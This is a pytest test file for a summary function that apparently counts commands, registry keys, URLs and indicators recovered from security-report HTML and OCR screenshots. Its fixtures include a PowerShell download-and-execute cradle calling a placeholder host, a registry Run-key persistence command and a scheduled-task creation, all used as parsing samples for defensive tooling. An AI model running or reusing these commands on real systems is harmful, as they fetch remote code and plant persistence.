"""P0.15C-2 · Acquisition Summary · release-gate tests."""
from __future__ import annotations

import pytest
from services.veee.summary import compute_summary


# ══════════════════════════════════════════════════════════════════
# Tolerance of missing data (contract §0.2 · "Not available" · UI-friendly)
# ══════════════════════════════════════════════════════════════════
def test_empty_inputs_return_all_zero_summary():
    s = compute_summary()
    sec = s["sections"]
    assert s["schema_version"] == "1.0"
    assert s["veee_enabled"] is False
    assert s["structured_blocks"] == 0
    assert sec["html"]        == {"paragraphs": 0, "tables": 0, "code_blocks": 0}
    assert sec["images"]["found"] == 0
    assert sec["images"]["processed"] == 0
    assert sec["images"]["skipped"]   == 0
    assert sec["recovered"] == {"commands": 0, "powershell": 0, "registry": 0,
                                    "urls": 0, "hashes": 0, "iocs": 0}
    assert sec["quality"]["average_ocr_confidence"]      == 0.0
    assert sec["quality"]["ocr_commands_extracted"]      == 0
    assert sec["quality"]["canonicalized_successfully"]  == 0
    assert sec["quality"]["classification_success_rate"] == 0.0
    assert sec["performance"] == {"processing_time_ms": 0.0,
                                       "cache_hits": 0, "cache_misses": 0}


def test_none_inputs_never_raise():
    s1 = compute_summary(None, None, None)
    s2 = compute_summary(structured_blocks=None, veee_records=None)
    assert s1["schema_version"] == "1.0"
    assert s2["schema_version"] == "1.0"


# ══════════════════════════════════════════════════════════════════
# HTML section counters
# ══════════════════════════════════════════════════════════════════
def test_html_section_counts_paragraphs_tables_and_code_blocks():
    html = "<p>A</p><p>B</p><table><tr><td>x</td></tr></table><pre>x</pre><code>y</code>"
    s = compute_summary(html_text=html)
    assert s["sections"]["html"] == {"paragraphs": 2, "tables": 1, "code_blocks": 2}


# ══════════════════════════════════════════════════════════════════
# VEEE records → images / recovered / quality
# ══════════════════════════════════════════════════════════════════
def _rec(**kwargs):
    prov = {"source": "image", "acquisition_level": "P3",
            "image_url": "https://x/1.png", "image_sha256": "abc",
            "bounding_box": {"x": 0, "y": 0, "w": 1, "h": 1},
            "ocr_engine": "tesseract-5", "ocr_confidence": 0.9}
    prov.update(kwargs.get("provenance") or {})
    return {"type": kwargs.get("type", "commandline"),
            "text": kwargs.get("text", ""),
            "provenance": prov}


def test_images_and_recovered_derived_from_records():
    records = [
        _rec(text="powershell.exe -nop -c iex(iwr http://x)"),
        _rec(text="reg add HKLM\\Software\\...\\Run /v X /d y /f"),
        _rec(text="schtasks /create /tn Y /tr Z"),
        _rec(text="ping 1.2.3.4 -n 1"),
        _rec(type="skipped", text="", provenance={"skipped": True, "reason": "not_code_screenshot"}),
        _rec(type="skipped", text="", provenance={"skipped": True, "reason": "not_code_screenshot"}),
    ]
    s = compute_summary(veee_records=records)
    sec = s["sections"]
    assert sec["images"]["ocr_candidates"] == 6
    assert sec["images"]["processed"]      == 4
    assert sec["images"]["skipped"]        == 2
    assert sec["images"]["skipped_reasons"] == {"not_code_screenshot": 2}
    assert sec["recovered"]["commands"]   == 4
    assert sec["recovered"]["powershell"] >= 1
    assert sec["recovered"]["registry"]   >= 1
    assert sec["recovered"]["urls"]       >= 1
    assert sec["recovered"]["iocs"]       >= 1


def test_quality_kpis_amendment_5():
    records = [
        _rec(text="powershell.exe -c ..."),                        # canonicalizable
        _rec(text="cmd.exe /c echo hi"),                            # canonicalizable
        _rec(text="something random that isnt a shell command"),    # NOT canonicalizable
    ]
    s = compute_summary(veee_records=records)
    q = s["sections"]["quality"]
    assert q["ocr_commands_extracted"] == 3
    assert q["canonicalized_successfully"] == 2
    # 2/3 = 66.7
    assert q["classification_success_rate"] == pytest.approx(66.7, abs=0.1)


# ══════════════════════════════════════════════════════════════════
# UI-friendly: never raises, always shape-stable
# ══════════════════════════════════════════════════════════════════
def test_summary_shape_is_stable_across_permutations():
    for records in [[], [{"type": "commandline", "text": ""}],
                       [_rec(text="whoami /all")]]:
        s = compute_summary(veee_records=records)
        for k in ("schema_version", "veee_enabled", "structured_blocks", "sections"):
            assert k in s
        for k in ("html", "images", "recovered", "quality", "performance"):
            assert k in s["sections"]
